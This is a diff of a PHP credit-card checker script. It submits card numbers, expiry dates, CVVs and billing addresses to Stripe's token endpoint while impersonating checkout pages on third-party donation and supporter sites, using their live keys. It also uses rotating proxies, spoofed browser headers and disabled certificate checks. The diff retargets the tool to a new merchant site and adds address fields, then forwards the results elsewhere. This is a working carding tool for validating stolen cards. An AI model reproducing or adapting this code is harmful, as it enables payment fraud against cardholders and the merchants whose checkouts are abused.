@@ -76,27 +76,29 @@ $super_proxy = 'zproxy.lum-superproxy.io';
 
 $ch = curl_init();
 /////////========Luminati
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 ////////=========Socks Proxy
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
-curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Host: api.stripe.com',
-'Accept: application/json',
-'Accept-Language: en',
-'Content-Type: application/x-www-form-urlencoded',
-'Origin: https://checkout.stripe.com',
-'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=ebf0ac27-8742-030c-235b-2e651543f771'));
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.senhoa.org%2Fpages%2Fdonate-stripe&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&time_on_page=56088&guid=NA&muid=b0606e04-acae-4293-8c0b-8e5d4e795002&sid=cf256315-5b24-4d81-9366-4f0aa07d99ae&key=pk_live_e3aCKx0V1arRUk8xe7227y7d');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+  'Accept: application/json',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US',
+'Content-Type: application/x-www-form-urlencoded',
+'Host: api.stripe.com',
+'Origin: https://checkout.stripe.com',
+'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=db2728ae-dec1-779d-608b-f26a3ced57a3',
+'Sec-Fetch-Dest: empty',
+'Sec-Fetch-Mode: cors',
+'Sec-Fetch-Site: same-site'));
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fhiberniansupporters.co.uk%2Fcheckout%2F%3Fid%3DaGlicyBzaGl0&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'+'.$last.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$postcode.'&card[address_country]=United+States&time_on_page=498114&guid=40669308-1871-4ea4-aeb9-6f07fa62f35f&muid=5e0416f9-2b0c-4fa2-ab3c-dea998dba0bd&sid=d6f8f8b2-bcb1-42fe-9dc3-88a9a4922fd9&key=pk_live_DD9Pty5w69xd8VzVL5h83MBY');
+
 $result = curl_exec($ch);
 $auth=['text'=>($result .$lista),];
  $ch = curl_init($poxyx);
